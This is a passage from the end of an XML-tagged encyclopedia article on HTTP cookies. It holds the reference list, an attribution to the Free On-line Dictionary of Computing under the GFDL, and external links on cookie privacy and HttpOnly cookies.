[https://www.owasp.org/index.php/HTTPOnly#Who_developed_HTTPOnly.3F_When.3F OWASP, first implementation of HTTPonly]</entry>
<entry id="18">
Microsoft, <weblink xlink:type="simple" xlink:href="http://msdn.microsoft.com/en-us/library/ms533046.aspx">
Mitigating Cross-site Scripting With HTTP-only Cookies</weblink></entry>
<entry id="21">
Microsoft, <weblink xlink:type="simple" xlink:href="http://msdn.microsoft.com/msdnmag/issues/02/09/securitytips/default.aspx">
Defend Your Code with Top Ten Security Tips Every Developer Must Know</weblink></entry>
<entry id="20">
http://www.php.net/manual/en/function.session-set-cookie-params.php PHP implementation of HttpOnly</entry>
<entry id="23">
<weblink xlink:type="simple" xlink:href="http://msdn.microsoft.com/library/default.asp?url=/workshop/author/persistence/overview.asp">
Introduction to Persistence</weblink>, <link xlink:type="simple" xlink:href="../316/63316.xml">
MSDN</link></entry>
<entry id="22">
"<weblink xlink:type="simple" xlink:href="http://www.news.com/8301-10784_3-9745630-7.html">
Google expires cookies sooner in minor privacy concession</weblink>", <link xlink:type="simple" xlink:href="../836/385836.xml">
Cnet</link>&#32;(June 16, 2007).&#32;Retrieved on <link>
2007-11-07</link>.&nbsp;</entry>
<entry id="25">
John Schwartz. <weblink xlink:type="simple" xlink:href="http://www.nytimes.com/2001/09/04/technology/04COOK.html">
Giving the Web a memory cost its users privacy</weblink>. New York Times. September 4, 2001</entry>
<entry id="24">
Mukund Sivaraman, <weblink xlink:type="simple" xlink:href="http://www.mukund.org/2006/09/11/clearing-cookies-is-not-enough-to-save-your-privacy/">
Clearing cookies is not enough to save your privacy</weblink> September 11, 2006</entry>
<entry id="27">
<weblink xlink:type="simple" xlink:href="http://groups.google.com/group/comp.infosystems.www.users/msg/9a210e5f72278328">
Usenet Post by Marc Andreessen: Here it is, world!</weblink></entry>
<entry id="26">
<weblink xlink:type="simple" xlink:href="http://wp.netscape.com/newsref/pr/newsrelease1.html">
Press Release: NETSCAPE COMMUNICATIONS OFFERS NEW NETWORK NAVIGATOR FREE ON THE INTERNET</weblink></entry>
<entry id="29">
Roger Clarke. <weblink xlink:type="simple" xlink:href="http://www.anu.edu.au/people/Roger.Clarke/II/Cookies.html">
Cookies</weblink></entry>
<entry id="28">
<weblink xlink:type="simple" xlink:href="http://www.microsoft.com/windows/IE/community/columns/historyofie.mspx">
The history of Internet Explorer</weblink></entry>
<entry id="31">
<weblink xlink:type="simple" xlink:href="http://www.yourhtmlsource.com/javascript/cookies.html">
Cookies in JavaScript</weblink></entry>
<entry id="30">
<weblink xlink:type="simple" xlink:href="http://msdn2.microsoft.com/en-us/library/ms533693.aspx">
cookie Property (document)</weblink></entry>
<entry id="34">
[https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HTTPOnly OWASP,  browsers supporting HTTPonly, and limitations]</entry>
<entry id="32">
<weblink xlink:type="simple" xlink:href="http://support.microsoft.com/kb/283185">
How To Manage Cookies In Internet Explorer 6.</weblink></entry>
<entry id="33">
Microsoft, <weblink xlink:type="simple" xlink:href="http://msdn.microsoft.com/en-us/library/ms533046.aspx">
Mitigating Cross-site Scripting With HTTP-only Cookies</weblink></entry>
</reflist>
</p>

<p>

<it>This article was originally based on material from the <work wordnetid="104599396" confidence="0.8">
<product wordnetid="104007894" confidence="0.8">
<creation wordnetid="103129123" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<wordbook wordnetid="106418693" confidence="0.8">
<book wordnetid="106410904" confidence="0.8">
<dictionary wordnetid="106418901" confidence="0.8">
<reference_book wordnetid="106417598" confidence="0.8">
<publication wordnetid="106589574" confidence="0.8">
<link xlink:type="simple" xlink:href="../324/11324.xml">
Free On-line Dictionary of Computing</link></publication>
</reference_book>
</dictionary>
</book>
</wordbook>
</artifact>
</creation>
</product>
</work>
, which is  under the <link xlink:type="simple" xlink:href="../782/18938782.xml">
GFDL</link>.</it></p>

</sec>
<sec>
<st>
External links</st>
<p>

<list>
<entry level="1" type="bullet">

<weblink xlink:type="simple" xlink:href="http://www.microsoft.com/info/cookies.mspx">
Information About Cookies</weblink> from <company wordnetid="108058098" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../001/19001.xml">
Microsoft</link></company>
</entry>
<entry level="1" type="bullet">

<weblink xlink:type="simple" xlink:href="http://epic.org/privacy/internet/cookies/">
Cookies</weblink> at the Electronic Privacy Information Center (EPIC)</entry>
<entry level="1" type="bullet">

<weblink xlink:type="simple" xlink:href="http://cpe.njit.edu/dlnotes/CIS/CIS350/TakingTheByteOutOfCookies.pdf">
Taking the Byte Out of Cookies: Privacy, Consent, and the Web</weblink> (PDF)</entry>
<entry level="1" type="bullet">

<weblink xlink:type="simple" xlink:href="http://www.junkbusters.com/cookies.html">
How Web Servers' Cookies Threaten Your Privacy</weblink> at JunkBusters</entry>
<entry level="1" type="bullet">

<weblink xlink:type="simple" xlink:href="http://archive.cabinetoffice.gov.uk/e-government/resources/handbook/html/4-7.asp">
Web handbook - Cookies</weblink> from Delivery And Transformation Group, Cabinet Office, UK</entry>
<entry level="1" type="bullet">

<weblink xlink:type="simple" xlink:href="http://www.comscore.com/press/release.asp?press=1389">
Cookie-Based Counting Overstates Size of Web Site Audiences</weblink> at ComScore</entry>
<entry level="1" type="bullet">

<weblink xlink:type="simple" xlink:href="http://www.pbs.org/mediashift/2007/11/dont_tread_on_our_cookiesthe_w.html">
Don’t Tread on Our Cookies - The Web Privacy Manifesto</weblink> at PBS</entry>
</list>
</p>
<p>

<image width="150px" src="">

</image>

</p>




</sec>
</bdy>
</heading>
</method>
</line>
</know-how>
</text>
</article>
